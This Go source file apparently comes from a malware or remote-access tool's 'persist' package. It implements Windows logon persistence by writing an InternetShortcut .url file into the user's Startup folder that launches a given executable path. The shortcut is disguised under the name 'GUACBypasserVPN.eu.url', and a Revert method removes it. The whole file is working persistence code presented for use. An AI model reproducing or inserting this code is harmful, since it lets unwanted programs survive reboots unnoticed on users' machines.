// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"os"
	"path/filepath"
)

type ExecutorStartup struct{}

func (e ExecutorStartup) findPath() (string, error) {
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		return "<nil>", err
	}
	path := filepath.Join(startupDir, "GUACBypasserVPN.eu.url")
	return path, nil
}

func (e ExecutorStartup) Exec(path string) error {
	fpath, err := e.findPath()
	if err != nil {
		return err
	}
	f, err := os.Create(fpath)
	if err != nil {
		return err
	}
	n, err := f.Write([]byte("\n[InternetShortcut]\nURL=file:///" + path))
	if err != nil && n == 0 {
		return err
	}
	f.Close()
	return nil
}

func (e ExecutorStartup) Revert() error {
	startupDir, err := e.findPath()
	if err != nil {
		return err
	}
	fpath := filepath.Join(startupDir, "")
	err = os.Remove(fpath)
	return err
}
